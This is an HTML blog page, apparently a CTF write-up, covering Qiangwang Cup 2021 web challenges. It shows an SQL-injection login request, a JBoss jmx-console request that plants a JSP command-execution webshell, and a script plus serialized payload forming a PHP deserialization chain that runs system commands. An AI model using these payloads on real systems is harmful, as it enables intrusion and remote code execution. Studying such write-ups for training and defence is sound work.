@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-CNTF3L2LQC"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CNTF3L2LQC');
+</script>  <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?a2d27f70a2f1f5f5edfb5884096627ae";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script> 
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="" />
+    
+    <title>
+      第五届强网杯全国网络安全挑战赛WEB-部分writeup-强网杯2021 - 白帽酱の博客
+    </title>
+    <link rel="manifest" href="/manifest.json" />
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+    
+<link rel="stylesheet" href="/style/style.css">
+
+  <meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="白帽酱の博客" type="application/atom+xml">
+</head>
+  <body>
+    <canvas id='pagemap'></canvas>
+    
+    <div id="post-toc" class="animated hiddenToc hide">
+      <span class="title">Toc</span>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#EASYWEB"><span class="toc-text">EASYWEB</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pop-master"><span class="toc-text">pop_master</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-%E5%AF%BB%E5%AE%9D"><span class="toc-text">[强网先锋]寻宝</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#KEY1"><span class="toc-text">KEY1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Key2"><span class="toc-text">Key2</span></a></li></ol></li></ol>
+    </div>
+    
+    <div id="fixed-menu-wrap">
+      <span class="iconfont icon-sousuo search-box menu-reset"></span>
+      <span class="icon-toc menu-reset">Toc</span>
+      <span class="iconfont icon-arrowup menu-reset"></span>
+    </div>
+    <div id="fixed-menu">
+      <span class="iconfont icon-menu-"></span>
+    </div>
+    <div id="progress">
+      <div class="line"></div>
+    </div>
+    <div id="search-shade" class="animated hiddenSearch hide">
+      <div class="input-wrap">
+        <span class="iconfont icon-sousuo search-box"></span>
+        <input type="text" placeholder="Search" />
+        <span class="iconfont icon-close"></span>
+      </div>
+      <div class="search-result">
+        <div class="meta">
+          <span><b id="result-count">0</b> results found</span>
+          <img src="/images/logo.jpeg" />
+        </div>
+        <ul id="result-box"></ul>
+      </div>
+    </div>
+    <div id="menu-mask" class="animated hideMenuMask hide">
+      <span class="iconfont icon-close"></span>
+      <div class="nav">
+        
+        <a href="/" class="">
+          首页
+        </a>
+        
+        <a href="/archives" class="">
+          归档
+        </a>
+        
+        <a href="/categories" class="">
+          分类
+        </a>
+        
+        <a href="/tags" class="">
+          标签
+        </a>
+        
+        <a href="/friends" class="">
+          友链
+        </a>
+        
+        <a href="/about" class="">
+          关于
+        </a>
+        
+      </div>
+    </div>
+    <div id="header">
+      <div class="intro">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <div class="author">白帽酱</div>
+      </div>
+      <div class="nav">
+        <span class="iconfont icon-menu menu-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+    </div>
+    <div id="side" class="animated bounceInLeft">
+      <div class="shrink">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <span class="iconfont icon-menu toggle-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+      <div class="magnify">
+        <div class="about">
+          <div class="author">白帽酱</div>
+          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        </div>
+
+        <div class="nav">
+          
+          <a href="/" class="">
+            首页
+          </a>
+          
+          <a href="/archives" class="">
+            归档
+          </a>
+          
+          <a href="/categories" class="">
+            分类
+          </a>
+          
+          <a href="/tags" class="">
+            标签
+          </a>
+          
+          <a href="/friends" class="">
+            友链
+          </a>
+          
+          <a href="/about" class="">
+            关于
+          </a>
+          
+          <a href="#" class="search-box">
+            <span class="iconfont icon-sousuo"></span>
+          </a>
+        </div>
+        <div class="bottom">
+          <div class="follow">
+            
+            <a href="https://github.com/burpheart" target="_block">
+              <span class="iconfont icon-github"></span>
+            </a>
+            
+            <a href="https://twitter.com/burp_heart" target="_block">
+              <span class="iconfont icon-twitter"></span>
+            </a>
+            
+            <a href="https://space.bilibili.com/32890488" target="_block">
+              <span class="iconfont icon-bilibili"></span>
+            </a>
+             
+            <a href="/atom.xml" target="_block">
+              <span class="iconfont icon-rss"></span>
+            </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="container">
+      <div class="main animated bounceInRight delay-0.7s">
+        <article class="post-entry">
+    <div class="header">
+      
+      <div class="title">第五届强网杯全国网络安全挑战赛WEB-部分writeup-强网杯2021</div>
+      <div class="meta">
+        <span class="item">
+          <span class="iconfont icon-time-circle"></span>
+          <span>2021/06/14</span>
+        </span>
+
+        
+
+         
+        <span class="item">
+          <span class="iconfont icon-folder"></span>
+          <span>
+              
+                
+                  <a href="/categories/CTF">CTF</a>
+                
+              
+          </span>
+        </span>
+        
+        
+         
+          <span class="item">
+            <span class="iconfont icon-tag1"></span>
+            <span>
+                
+                  
+                    <a href="/tags/CTF">CTF</a>
+                  
+                
+                  
+                    <a href="/tags/WRITEUP">WRITEUP</a>
+                  
+                
+                  
+                    <a href="/tags/强网杯">强网杯</a>
+                  
+                
+            </span>
+          </span>
+         
+      </div>
+      <div>
+      </div>
+    </div>
+    <html><head></head><body><h1 id="EASYWEB">EASYWEB<a class="post-anchor" href="#EASYWEB"></a></h1><p> <a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/IEzFq6ue2vtodgn.png" data-caption="LZYFHP@LAC_IENMHL__OT8M.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/IEzFq6ue2vtodgn.png" alt="LZYFHP@LAC_IENMHL__OT8M.png"></a><br>控制台查看网络请求发现flies</p>
+<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/JmA5QSIRXhbs1xD.png" data-caption="PM~Z_FZ__FU_B_V_FHG7_ZD.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/JmA5QSIRXhbs1xD.png" alt="PM~Z_FZ__FU_B_V_FHG7_ZD.png"></a><br>访问47.104.137.239/files/c09358adff2ebfff2ef9b4fbacc4ac0b 下载hint.txt 拿到提示</p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">Try to scan 35000-40000 ^_^.<br>All tables are empty except for the table where the username and password are located<br>Table: employee<br></code></pre></td></tr></tbody></table></figure>
+<p>根据提示通过端口扫描发现36842端口开放<br><a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/Lgmr5dItYDAoUQ7.png" data-caption="图片.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/Lgmr5dItYDAoUQ7.png" alt="图片.png"></a><br><a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/LdQgYXrc5qsoWTE.png" data-caption="图片.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/LdQgYXrc5qsoWTE.png" alt="图片.png"></a><br>username存在sql注入</p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">POST /account/login HTTP/1.1<br>Host: 47.104.137.239:36842<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 35<br>DNT: 1<br>Connection: close<br>Referer: http://121.42.242.238:36842/account/login<br>Cookie: ci_session=bo397pc9n0pd318uetdbl1r5rh33u3jb<br>Upgrade-Insecure-Requests: 1<br><br>username=admin*&amp;password=admin<br></code></pre></td></tr></tbody></table></figure>
+<p> <a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/2g7hXQeJl19pSIK.png" data-caption="图片.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/2g7hXQeJl19pSIK.png" alt="图片.png"></a><br>拿到登陆账号密码<br>admin 99f609527226e076d668668582ac4420<br>登陆后台<br>后台没有可以利用的地方</p>
+<p>继续扫描目录 发现文件上传路由<br><a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/pHvw9ZAPko3mKfd.png" data-caption="图片.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/pHvw9ZAPko3mKfd.png" alt="图片.png"></a><br>构造文件名绕过限制上传php文件<br> <a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/WDAnS9UoNvd2x5l.png" data-caption="图片.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/WDAnS9UoNvd2x5l.png" alt="图片.png"></a><br>由于权限太低无法getflag (只有owner有权限 flag权限应该是0440) 需要root用户组<br>继续查看监听端口发现有其他服务<br> <a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/64pO5KqTaVB3sjg.png" data-caption="图片.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/64pO5KqTaVB3sjg.png" alt="图片.png"></a><br>通过上传的小马写入新的phpshell<br>通过shell搭建隧道 访问web服务</p>
+<p>发现是一个存在jmx-console未授权访问的jboss</p>
+<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/CDOg7yxTh1dzb9m.png" data-caption="图片.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/CDOg7yxTh1dzb9m.png" alt="图片.png"></a></p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">/jmx-console/HtmlAdaptor?action=invokeOpByName&amp;name=jboss.admin%3Aservice%3DDeploymentFileRepository&amp;methodName=store&amp;argType=java.lang.String&amp;arg0=August.war&amp;argType=java.lang.String&amp;&amp;arg1=shell1&amp;argType=java.lang.String&amp;arg2=.jsp&amp;argType=java.lang.String&amp;arg3=&lt;%25 if("023".equals(request.getParameter("pwd"))){java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("&lt;pre&gt;");while((a=in.read(b))!=-1){out.println(new String(b));}out.print("&lt;/pre&gt;");}%25&gt;&amp;argType=boolean&amp;arg4=True<br></code></pre></td></tr></tbody></table></figure>
+<p>写入一句话shell<br> <a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/H6rkoq2up8gwE4O.png" data-caption="图片.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/H6rkoq2up8gwE4O.png" alt="图片.png"></a><br>成功getflag<br><a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/Ijd1WXsGUiyOYZB.png" data-caption="图片.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/Ijd1WXsGUiyOYZB.png" alt="图片.png"></a></p>
+<h1 id="pop-master">pop_master<a class="post-anchor" href="#pop-master"></a></h1><p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/tc1SGF7MAUHKOiW.png" data-caption="图片.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/tc1SGF7MAUHKOiW.png" alt="图片.png"></a><br><a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/lJqMPTBeDxcLoAQ.png" data-caption="图片.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/lJqMPTBeDxcLoAQ.png" alt="图片.png"></a><br>该题需要构造反序列化利用链 最终实现RCE<br>由于该题目类数量巨大1W个 编写自动化脚本构造pop链</p>
+<p>第一步将class.php.txt转化成AST(抽象语法树) 保存为json格式<br>&lt;?php<br>ini_set(“memory_limit”,”-1”);<br>echo(json_encode(ast\parse_file(“class.php”, $version=70)));<br>构造比较简单A-&gt;B-&gt;C-&gt;…….-&gt;包含EVAL()的class function<br><a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/SdG3znaweP8RKCv.png" data-caption="图片.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/SdG3znaweP8RKCv.png" alt="图片.png"></a><br>调用这里有几个坑 1.调用途中有参数污染(附加垃圾数据) 2.调用途中传参可能被清空 (传参被赋值未定义的变量)3.调用途中传参可能被修改 (直接赋值为垃圾数据)<br>所以并不是找到调用链就可以完成工作 而是需要找到可以利用的调用链</p>
+<p>自动化代码:<br>PS:没有什么参考价值 只对该题可用 因为固定3种函数结构所以偷懒把参数写死了 初学py语言 第一次做AST树解析用这种笨方法)</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"12.json"</span>) <span class="hljs-keyword">as</span> f:<br>    line=f.readline()<br>    result=json.loads(line)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(result[<span class="hljs-string">'children'</span>]))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">asb</span>(<span class="hljs-params">name,s,s1=<span class="hljs-string">''</span></span>):</span><br>    ee = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> result[<span class="hljs-string">'children'</span>]:<br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> a[<span class="hljs-string">'children'</span>][<span class="hljs-string">'stmts'</span>][<span class="hljs-string">'children'</span>]:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">'name'</span> <span class="hljs-keyword">in</span> b[<span class="hljs-string">'children'</span>].keys():<br>                <span class="hljs-keyword">if</span> (b[<span class="hljs-string">'children'</span>][<span class="hljs-string">'name'</span>] == <span class="hljs-string">'gG1T5D'</span>):<br>                    ee = <span class="hljs-number">0</span><br>                    <span class="hljs-comment">#ee=1</span><br>                <span class="hljs-keyword">if</span> (b[<span class="hljs-string">'children'</span>][<span class="hljs-string">'name'</span>] == name):<br>                    test(a)<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(b[<span class="hljs-string">'children'</span>][<span class="hljs-string">'stmts'</span>][<span class="hljs-string">'children'</span>])==<span class="hljs-number">3</span>):<br>                        q = b[<span class="hljs-string">'children'</span>][<span class="hljs-string">'stmts'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-number">1</span>][<span class="hljs-string">'children'</span>][<span class="hljs-number">0</span>][<span class="hljs-string">'children'</span>][<span class="hljs-string">'cond'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-string">'args'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-number">1</span>]<br>                        w = b[<span class="hljs-string">'children'</span>][<span class="hljs-string">'stmts'</span>][<span class="hljs-string">'children'</span>][random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)][<span class="hljs-string">'children'</span>][<span class="hljs-number">0</span>][<span class="hljs-string">'children'</span>][<span class="hljs-string">'cond'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-string">'args'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-number">1</span>]<span class="hljs-comment">#随机分支 玄学构造</span><br>                        <span class="hljs-comment">#print(s + q)</span><br>                        <span class="hljs-comment">#print(s + w)</span><br>                        ran_str = <span class="hljs-string">''</span>.join(random.sample(string.ascii_letters, <span class="hljs-number">8</span>))<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">'$'</span>+ran_str+<span class="hljs-string">'=new '</span>+a[<span class="hljs-string">'children'</span>][<span class="hljs-string">'name'</span>]+<span class="hljs-string">'();'</span>)<br>                        s11=<span class="hljs-string">'$'</span> + ran_str + <span class="hljs-string">'-&gt;'</span> + a[<span class="hljs-string">'children'</span>][<span class="hljs-string">'stmts'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-number">0</span>][<span class="hljs-string">'children'</span>][<span class="hljs-string">'props'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-number">0</span>][<span class="hljs-string">'children'</span>][<span class="hljs-string">'name'</span>] + <span class="hljs-string">'='</span><br>                        <span class="hljs-comment">#if s1!='':</span><br><br>                        <span class="hljs-comment"># asb(w, s +w+'--&gt;')</span><br>                        <span class="hljs-comment"># asb(q, s +q+'--&gt;')</span><br>                        <span class="hljs-keyword">if</span> ee!=<span class="hljs-number">1</span>:<br>                            asb(w,s,s11)<span class="hljs-comment"># 分支函数1</span><br>                            <span class="hljs-comment">#asb(q, s, s11)# 分支函数2</span><br>                            <span class="hljs-keyword">if</span> ran_str == <span class="hljs-string">''</span>:<br>                                exit()<br>                            <span class="hljs-built_in">print</span>(s1 + <span class="hljs-string">'$'</span> + ran_str+<span class="hljs-string">';'</span>)<br><br><br>                        <span class="hljs-comment">#asb(q, s +q+'--&gt;')</span><br><br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-keyword">if</span> <span class="hljs-string">'method'</span> <span class="hljs-keyword">in</span> b[<span class="hljs-string">'children'</span>][<span class="hljs-string">'stmts'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-number">1</span>][<span class="hljs-string">'children'</span>].keys():<span class="hljs-comment"># 没有分支</span><br>                            q = b[<span class="hljs-string">'children'</span>][<span class="hljs-string">'stmts'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-number">1</span>][<span class="hljs-string">'children'</span>][<span class="hljs-string">'method'</span>]<br>                            ran_str = <span class="hljs-string">''</span>.join(random.sample(string.ascii_letters, <span class="hljs-number">8</span>))<br>                            <span class="hljs-built_in">print</span>(<span class="hljs-string">'$'</span> + ran_str + <span class="hljs-string">'=new '</span> + a[<span class="hljs-string">'children'</span>][<span class="hljs-string">'name'</span>] + <span class="hljs-string">'();'</span>)<br>                            s11 = <span class="hljs-string">'$'</span> + ran_str + <span class="hljs-string">'-&gt;'</span> + a[<span class="hljs-string">'children'</span>][<span class="hljs-string">'stmts'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-number">0</span>][<span class="hljs-string">'children'</span>][<span class="hljs-string">'props'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-number">0</span>][<span class="hljs-string">'children'</span>][<span class="hljs-string">'name'</span>] + <span class="hljs-string">'='</span><br>                            <span class="hljs-comment">#print(s + q)</span><br>                            <span class="hljs-keyword">if</span> ee != <span class="hljs-number">1</span>:<br>                                asb(q, s, s11)<br>                                <span class="hljs-keyword">if</span> ran_str == <span class="hljs-string">''</span>:<br>                                    exit()<br>                                <span class="hljs-built_in">print</span>(s1 + <span class="hljs-string">'$'</span> + ran_str + <span class="hljs-string">';'</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>(<span class="hljs-params">d</span>):</span><br>    <span class="hljs-comment">#if name in {'Name','COiLxB'}:</span><br>       <span class="hljs-comment">#print('nono')</span><br>        <span class="hljs-comment">#exit()</span><br>    <span class="hljs-keyword">try</span>:<br>        a=d[<span class="hljs-string">'children'</span>][<span class="hljs-string">'stmts'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-number">1</span>][<span class="hljs-string">'children'</span>][<span class="hljs-string">'params'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-number">0</span>][<span class="hljs-string">'children'</span>][<span class="hljs-string">'name'</span>]<br>        b=d[<span class="hljs-string">'children'</span>][<span class="hljs-string">'stmts'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-number">1</span>][<span class="hljs-string">'children'</span>][<span class="hljs-string">'stmts'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-number">0</span>][<span class="hljs-string">'children'</span>][<span class="hljs-string">'stmts'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-number">0</span>][<span class="hljs-string">'children'</span>][<span class="hljs-string">'var'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-string">'name'</span>]<br>        c=d[<span class="hljs-string">'children'</span>][<span class="hljs-string">'stmts'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-number">1</span>][<span class="hljs-string">'children'</span>][<span class="hljs-string">'stmts'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-number">0</span>][<span class="hljs-string">'children'</span>][<span class="hljs-string">'stmts'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-number">0</span>][<span class="hljs-string">'children'</span>][<span class="hljs-string">'expr'</span>][<span class="hljs-string">'children'</span>][<span class="hljs-string">'name'</span>]<br>        <span class="hljs-keyword">if</span>(a==b <span class="hljs-keyword">and</span> b!=c <span class="hljs-keyword">and</span> a!=<span class="hljs-string">'DgiNa'</span>): <span class="hljs-comment">#判断赋值是否是用不存在的变量覆盖传参</span><br><br>            <span class="hljs-built_in">print</span>(a,b,c)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">'no'</span>)<br>            asb(<span class="hljs-string">'YYdqkf'</span>, <span class="hljs-string">'YYdqkf'</span> + <span class="hljs-string">'--&gt;'</span>)<span class="hljs-comment">#重新搜索</span><br>            os._exit(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>asb(<span class="hljs-string">'YYdqkf'</span>,<span class="hljs-string">'YYdqkf'</span>+<span class="hljs-string">'--&gt;'</span>)<br></code></pre></td></tr></tbody></table></figure>
+<p>编写脚本处理AST<br>随机抽取一条构造链 检验是否正常执行(传参修改检测) 反复抽取得到可用的链<br><a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/tJ9bOGq5xu43MaQ.png" data-caption="图片.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/tJ9bOGq5xu43MaQ.png" alt="图片.png"></a><br>ps:例图输出与下面代码无关 找不到成功的图了</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>此处省略<span class="hljs-number">3</span>M大小的源<span class="hljs-class"><span class="hljs-keyword">class</span></span><br>$a=new WK4tcG();<br><span class="hljs-variable">$prXsQMfO</span>=<span class="hljs-keyword">new</span> WK4tcG();<br><span class="hljs-variable">$DLcTtAga</span>=<span class="hljs-keyword">new</span> xaeGnG();<br><span class="hljs-variable">$lcbgRpGI</span>=<span class="hljs-keyword">new</span> oAMzcx();<br><span class="hljs-variable">$IatldcbW</span>=<span class="hljs-keyword">new</span> p38LCI();<br><span class="hljs-variable">$nULgbaKw</span>=<span class="hljs-keyword">new</span> GbfW4c();<br><span class="hljs-variable">$ASyQaYMV</span>=<span class="hljs-keyword">new</span> m2s3zO();<br><span class="hljs-variable">$GMwztlCS</span>=<span class="hljs-keyword">new</span> PgSSqR();<br><span class="hljs-variable">$MegPsOnX</span>=<span class="hljs-keyword">new</span> RLuIRL();<br><span class="hljs-variable">$neJOwgfu</span>=<span class="hljs-keyword">new</span> WykBAC();<br><span class="hljs-variable">$PNHChDce</span>=<span class="hljs-keyword">new</span> g6hgDh();<br><span class="hljs-variable">$BzceWjKp</span>=<span class="hljs-keyword">new</span> HDaeRV();<br><span class="hljs-variable">$YThMXwcb</span>=<span class="hljs-keyword">new</span> bREm3w();<br><span class="hljs-variable">$xWVjhwmO</span>=<span class="hljs-keyword">new</span> D0aZh5();<br><span class="hljs-variable">$BIbCvgZD</span>=<span class="hljs-keyword">new</span> T9NX4U();<br><span class="hljs-variable">$prvhXPMW</span>=<span class="hljs-keyword">new</span> eWciOL();<br><span class="hljs-variable">$NVHbgdzD</span>=<span class="hljs-keyword">new</span> TqWDlm();<br><span class="hljs-variable">$mszgihWC</span>=<span class="hljs-keyword">new</span> XoFA87();<br><span class="hljs-variable">$vDBkPwqO</span>=<span class="hljs-keyword">new</span> MU1ai5();<br><span class="hljs-variable">$ZYHhsIid</span>=<span class="hljs-keyword">new</span> eHtdBF();<br><span class="hljs-variable">$ZYHhsIid</span>-&gt;V7XKdgi=<span class="hljs-keyword">new</span> DNUWgV();<br><span class="hljs-variable">$vDBkPwqO</span>-&gt;zXEmp6T=<span class="hljs-variable">$ZYHhsIid</span>;<br><span class="hljs-variable">$mszgihWC</span>-&gt;z35pfqP=<span class="hljs-variable">$vDBkPwqO</span>;<br><span class="hljs-variable">$NVHbgdzD</span>-&gt;KGgGFnb=<span class="hljs-variable">$mszgihWC</span>;<br><span class="hljs-variable">$prvhXPMW</span>-&gt;D6qeYVK=<span class="hljs-variable">$NVHbgdzD</span>;<br><span class="hljs-variable">$BIbCvgZD</span>-&gt;UwQCEH2=<span class="hljs-variable">$prvhXPMW</span>;<br><span class="hljs-variable">$xWVjhwmO</span>-&gt;ST8sCZq=<span class="hljs-variable">$BIbCvgZD</span>;<br><span class="hljs-variable">$YThMXwcb</span>-&gt;pMgtiwK=<span class="hljs-variable">$xWVjhwmO</span>;<br><span class="hljs-variable">$BzceWjKp</span>-&gt;OO72gIu=<span class="hljs-variable">$YThMXwcb</span>;<br><span class="hljs-variable">$PNHChDce</span>-&gt;GYBlHLq=<span class="hljs-variable">$BzceWjKp</span>;<br><span class="hljs-variable">$neJOwgfu</span>-&gt;yWYNYcP=<span class="hljs-variable">$PNHChDce</span>;<br><span class="hljs-variable">$MegPsOnX</span>-&gt;dFy0Irz=<span class="hljs-variable">$neJOwgfu</span>;<br><span class="hljs-variable">$GMwztlCS</span>-&gt;Cs99EPC=<span class="hljs-variable">$MegPsOnX</span>;<br><span class="hljs-variable">$ASyQaYMV</span>-&gt;QidIkAq=<span class="hljs-variable">$GMwztlCS</span>;<br><span class="hljs-variable">$nULgbaKw</span>-&gt;gE4DrP9=<span class="hljs-variable">$ASyQaYMV</span>;<br><span class="hljs-variable">$IatldcbW</span>-&gt;OksedLV=<span class="hljs-variable">$nULgbaKw</span>;<br><span class="hljs-variable">$lcbgRpGI</span>-&gt;SUxaKsh=<span class="hljs-variable">$IatldcbW</span>;<br><span class="hljs-variable">$DLcTtAga</span>-&gt;u3832FP=<span class="hljs-variable">$lcbgRpGI</span>;<br><span class="hljs-variable">$a</span>-&gt;fBuH5Og=<span class="hljs-variable">$DLcTtAga</span>;<br><span class="hljs-comment">//$a = $_GET['pop'];</span><br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'argv'</span>];<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//$a = unserialize($a);</span><br><span class="hljs-comment">//var_dump($a);</span><br><span class="hljs-variable">$a</span>-&gt;YYdqkf(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></tbody></table></figure>
+<p>生成序列化文本<br>?pop=O:6:%22WK4tcG%22:1:{s:7:%22fBuH5Og%22;O:6:%22xaeGnG%22:1:{s:7:%22u3832FP%22;O:6:%22oAMzcx%22:1:{s:7:%22SUxaKsh%22;O:6:%22p38LCI%22:1:{s:7:%22OksedLV%22;O:6:%22GbfW4c%22:1:{s:7:%22gE4DrP9%22;O:6:%22m2s3zO%22:1:{s:7:%22QidIkAq%22;O:6:%22PgSSqR%22:1:{s:7:%22Cs99EPC%22;O:6:%22RLuIRL%22:1:{s:7:%22dFy0Irz%22;O:6:%22WykBAC%22:1:{s:7:%22yWYNYcP%22;O:6:%22g6hgDh%22:1:{s:7:%22GYBlHLq%22;O:6:%22HDaeRV%22:1:{s:7:%22OO72gIu%22;O:6:%22bREm3w%22:1:{s:7:%22pMgtiwK%22;O:6:%22D0aZh5%22:1:{s:7:%22ST8sCZq%22;O:6:%22T9NX4U%22:1:{s:7:%22UwQCEH2%22;O:6:%22eWciOL%22:1:{s:7:%22D6qeYVK%22;O:6:%22TqWDlm%22:1:{s:7:%22KGgGFnb%22;O:6:%22XoFA87%22:1:{s:7:%22z35pfqP%22;O:6:%22MU1ai5%22:1:{s:7:%22zXEmp6T%22;O:6:%22eHtdBF%22:1:{s:7:%22V7XKdgi%22;O:6:%22DNUWgV%22:1:{s:7:%22bieiHE3%22;N;}}}}}}}}}}}}}}}}}}}}&amp;argv=system(%27cat%20/flag%27);//<br>访问即可getflag<br><a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/zANFc4PhXUGswWr.png" data-caption="图片.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/zANFc4PhXUGswWr.png" alt="图片.png"></a></p>
+<h1 id="强网先锋-寻宝">[强网先锋]寻宝<a class="post-anchor" href="#强网先锋-寻宝"></a></h1><p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/06/14/HFq37gXWPwI8rJL.png" data-caption="图片.png" data-fancybox="images"><img src="https://i.loli.net/2021/06/14/HFq37gXWPwI8rJL.png" alt="图片.png"></a><br>需要两个KEY 来getflag</p>
